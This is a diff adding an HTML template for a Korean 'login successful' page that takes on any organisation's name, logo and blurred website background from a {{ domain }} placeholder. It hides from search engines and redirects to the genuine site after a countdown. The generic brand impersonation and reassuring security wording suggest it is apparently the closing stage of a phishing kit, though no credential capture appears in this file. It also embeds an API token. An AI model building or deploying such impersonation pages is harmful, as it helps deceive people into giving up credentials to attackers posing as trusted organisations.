@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>{{ domain }} - 로그인 성공</title>
+<link rel="icon" type="image/png" href="https://img.logo.dev/{{ domain }}?token=pk_X3Yst72FQUOeVfOd-dlhKg">
+<style>
+:root {
+  --primary:#2563eb;
+  --bg:#020617;
+  --card:rgba(2,6,23,.92);
+  --border:#1f2937;
+  --text:#e5e7eb;
+  --muted:#94a3b8;
+  --success:#22c55e;
+}
+
+*{box-sizing:border-box;margin:0;padding:0}
+
+html,body{
+  height:100%;
+  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;
+  background:var(--bg);
+  color:var(--text);
+  overflow:hidden;
+}
+
+/* Background */
+.background-frame{
+  position:fixed;
+  inset:0;
+  width:100%;
+  height:100%;
+  border:none;
+  z-index:-1;
+  filter:blur(8px) brightness(.65);
+  transform:scale(1.05);
+}
+
+/* Animations */
+body{animation:fade .7s ease both}
+@keyframes fade{from{opacity:0}to{opacity:1}}
+
+.wrap{
+  min-height:100%;
+  display:grid;
+  place-items:center;
+  padding:24px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:var(--card);
+  backdrop-filter:blur(10px);
+  border:1px solid var(--border);
+  border-radius:14px;
+  padding:32px 28px;
+  box-shadow:0 30px 60px rgba(0,0,0,.55);
+  animation:up .5s ease both;
+}
+
+@keyframes up{
+  from{transform:translateY(14px);opacity:0}
+  to{transform:translateY(0);opacity:1}
+}
+
+/* Brand */
+.brand{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-bottom:22px;
+}
+
+.brand img{
+  width:46px;height:46px;
+  border-radius:10px;
+  padding:6px;
+  background:#0b1220;
+  border:1px solid var(--border);
+}
+
+.brand h1{
+  font-size:18px;
+  font-weight:600;
+}
+
+.subtitle{
+  font-size:13px;
+  color:var(--muted);
+}
+
+/* Success message */
+.success{
+  text-align:center;
+  margin-bottom:22px;
+}
+
+.success-icon{
+  width:64px;
+  height:64px;
+  margin:0 auto 16px;
+  fill:var(--success);
+  animation:check .5s ease both;
+}
+
+@keyframes check{
+  from{transform:scale(0) rotate(-180deg);opacity:0}
+  to{transform:scale(1) rotate(0deg);opacity:1}
+}
+
+.success h2{
+  font-size:20px;
+  font-weight:600;
+  color:var(--success);
+  margin-bottom:8px;
+}
+
+.success p{
+  font-size:14px;
+  color:var(--muted);
+}
+
+.countdown{
+  font-size:16px;
+  font-weight:500;
+  color:var(--primary);
+  margin-top:8px;
+}
+
+/* Trust block */
+.trust{
+  margin-top:18px;
+  font-size:12px;
+  color:var(--muted);
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+
+.lock{
+  width:16px;height:16px;
+  fill:var(--success);
+}
+
+/* Footer */
+.footer{
+  margin-top:18px;
+  font-size:11px;
+  color:var(--muted);
+  text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<iframe src="https://www.{{ domain }}" class="background-frame" aria-hidden="true"></iframe>
+
+<div class="wrap">
+<main class="card">
+
+<div class="brand">
+  <img src="https://img.logo.dev/{{ domain }}?token=pk_X3Yst72FQUOeVfOd-dlhKg" alt="{{ domain }} logo">
+  <div>
+    <h1>{{ domain }}</h1>
+    <div class="subtitle" data-i18n>보안 액세스 포털</div>
+  </div>
+</div>
+
+<div class="success">
+  <svg class="success-icon" viewBox="0 0 24 24">
+    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+  </svg>
+  <h2 data-i18n>로그인 성공</h2>
+  <p data-i18n>로그인에 성공하셨습니다. 이제 다음 페이지로 이동합니다...</p>
+  <div class="countdown" id="countdown" data-i18n>5초 후에 리디렉션됩니다...</div>
+</div>
+
+<div class="trust">
+  <svg class="lock" viewBox="0 0 24 24">
+    <path d="M12 1a5 5 0 00-5 5v4H6a2 2 0 00-2 2v9a2 2 0 002 2h12a2 2 0 002-2v-9a2 2 0 00-2-2h-1V6a5 5 0 00-5-5zm-3 9V6a3 3 0 016 0v4H9z"/>
+  </svg>
+  <span data-i18n>보안 연결이 설정되었습니다.</span>
+</div>
+
+<div class="footer" data-i18n>
+  © 2026 {{ domain }} · Privacy · Terms · Security
+</div>
+
+</main>
+</div>
+
+<script>
+  // Countdown redirect
+  let countdown = 5;
+  const countdownElement = document.getElementById('countdown');
+  const interval = setInterval(() => {
+    countdown--;
+    countdownElement.textContent = `Redirecting in ${countdown} second${countdown !== 1 ? 's' : ''}...`;
+    if (countdown <= 0) {
+      clearInterval(interval);
+      window.location.href = 'https://{{ domain }}';
+    }
+  }, 1000);
+
+  // 🌍 Auto Translation
+  (async () => {
+    const lang = (navigator.language || "en").slice(0,2);
+    if(lang === "en") return;
+
+    const elements = [...document.querySelectorAll("[data-i18n]")];
+    const texts = [...new Set(elements.map(el=>el.innerText.trim()).filter(Boolean))];
+    if(!texts.length) return;
+
+    async function translate(endpoint){
+      const res = await fetch(endpoint,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body: JSON.stringify({q:texts,source:"en",target:lang,format:"text"})
+      });
+      return res.json();
+    }
+
+    let data;
+    try{
+      data = await translate("https://libretranslate.de/translate");
+    }catch{
+      try{
+        data = await translate("https://translate.argosopentech.com/translate");
+      }catch{return;}
+    }
+
+    if(!data?.translatedText) return;
+
+    const map = {};
+    texts.forEach((t,i)=>map[t]=data.translatedText[i]);
+    elements.forEach(el=>{
+      const original = el.innerText.trim();
+      if(map[original]) el.innerText = map[original];
+    });
+  })();
+</script>
+
+</body>
+</html>
+
